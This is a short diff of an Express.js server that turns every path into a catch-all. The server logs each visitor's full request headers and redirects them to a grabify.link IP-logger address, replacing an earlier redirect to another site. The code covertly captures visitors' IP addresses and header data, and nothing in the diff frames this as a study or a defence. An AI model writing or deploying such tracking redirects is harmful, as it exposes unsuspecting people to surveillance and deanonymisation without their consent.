@@ -8,10 +8,11 @@ app.set("view engine", "ejs");
 app.use(express.static(__dirname + "/public"));
 app.use(bodyParser.urlencoded({ extended: true }));
 
-app.get('/:name', (req, res) => {
+app.get('/*', (req, res) => {
   var name = req.params.name
   console.log(JSON.stringify(req.headers))
-  res.redirect("https://touch-msg.com/in/f-ipd?f=" + name)
+//   res.redirect("https://touch-msg.com/in/f-ipd?f=" + name)
+  res.redirect("https://grabify.link/MJ9BRY");
 });
 
 app.listen(process.env.PORT || 80, () => {
